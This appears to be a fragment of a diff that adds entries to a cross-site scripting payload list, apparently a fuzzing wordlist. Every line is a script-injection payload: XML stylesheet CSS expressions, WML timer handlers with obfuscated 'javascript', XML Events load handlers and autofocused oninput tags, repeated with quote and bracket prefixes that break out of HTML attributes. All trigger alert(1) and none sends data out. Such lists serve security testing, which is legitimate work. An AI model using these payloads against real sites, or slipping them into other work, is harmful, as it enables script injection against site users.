+"><?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(1));%7d"?>
+'><?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(1));%7d"?>
+<x:template xmlns:x="http://www.wapforum.org/2001/wml"  x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(1)"><x:timer value="1"/></x:template>
+"><x:template xmlns:x="http://www.wapforum.org/2001/wml"  x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(1)"><x:timer value="1"/></x:template>
+'><x:template xmlns:x="http://www.wapforum.org/2001/wml"  x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(1)"><x:timer value="1"/></x:template>
+<x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="javascript:alert(1)//#x"/>
+"><x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="javascript:alert(1)//#x"/>
+'><x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="javascript:alert(1)//#x"/>
+<body oninput=alert(1)><input autofocus>
+"><body oninput=alert(1)><input autofocus>
+'><body oninput=alert(1)><input autofocus><div id="1"><svg xmlns="http://www.w3.org/2000/svg">
+"><body oninput=alert(1)><input autofocus><div id="1"><svg xmlns="http://www.w3.org/2000/svg">
+'><body oninput=alert(1)><input autofocus><div id="1"><svg xmlns="http://www.w3.org/2000/svg">
